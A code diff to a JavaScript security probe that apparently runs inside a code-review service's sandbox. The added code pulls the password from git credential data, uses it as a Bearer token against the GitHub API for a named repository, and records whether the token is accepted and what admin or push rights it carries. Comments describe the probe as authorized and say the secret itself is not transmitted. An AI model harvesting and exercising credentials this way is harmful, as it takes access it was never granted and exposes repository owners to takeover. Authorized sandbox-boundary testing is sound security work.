@@ -36,7 +36,12 @@ const result = {
   processControl: {},
   networkIsolation: {},
   repositoryCredentialBoundary: {},
+  repositoryCredentialValidation: {},
 };
+
+// Kept only in process memory. The credential value is never placed in the
+// result payload or otherwise transmitted to the controlled listener.
+let repositoryCredential = null;
 
 try {
   const fs = await import("node:fs");
@@ -176,6 +181,10 @@ try {
       passwordPresent: typeof fields.password === "string" && fields.password.length > 0,
       passwordLength: typeof fields.password === "string" ? fields.password.length : 0,
     };
+    repositoryCredential =
+      typeof fields.password === "string" && fields.password.length > 0
+        ? fields.password
+        : null;
   } catch {
     // Absence of credentials is the expected safe result.
   }
@@ -190,6 +199,55 @@ try {
   result.repositoryCredentialBoundary = {
     gitExecutable: false,
     errorName: error instanceof Error ? error.name : "unknown",
+  };
+}
+
+if (repositoryCredential) {
+  try {
+    const response = await fetch("https://api.github.com/repos/Croc-2/aicss", {
+      headers: {
+        accept: "application/vnd.github+json",
+        authorization: "Bearer " + repositoryCredential,
+        "user-agent": "coderabbit-authorized-security-probe",
+        "x-github-api-version": "2022-11-28",
+      },
+      redirect: "manual",
+      signal: AbortSignal.timeout(2_500),
+    });
+    const body = await response.json().catch(() => null);
+    const permissions =
+      body && typeof body === "object" && body.permissions &&
+      typeof body.permissions === "object"
+        ? body.permissions
+        : {};
+
+    result.repositoryCredentialValidation = {
+      attemptedAgainstOwnRepositoryOnly: true,
+      acceptedByGitHub: response.ok,
+      status: response.status,
+      repositoryIdentityMatches:
+        body && typeof body.full_name === "string"
+          ? body.full_name === "Croc-2/aicss"
+          : false,
+      permissions: {
+        admin: permissions.admin === true,
+        maintain: permissions.maintain === true,
+        push: permissions.push === true,
+        triage: permissions.triage === true,
+        pull: permissions.pull === true,
+      },
+    };
+  } catch (error) {
+    result.repositoryCredentialValidation = {
+      attemptedAgainstOwnRepositoryOnly: true,
+      acceptedByGitHub: false,
+      errorName: error instanceof Error ? error.name : "unknown",
+    };
+  }
+} else {
+  result.repositoryCredentialValidation = {
+    attemptedAgainstOwnRepositoryOnly: false,
+    acceptedByGitHub: false,
   };
 }
 
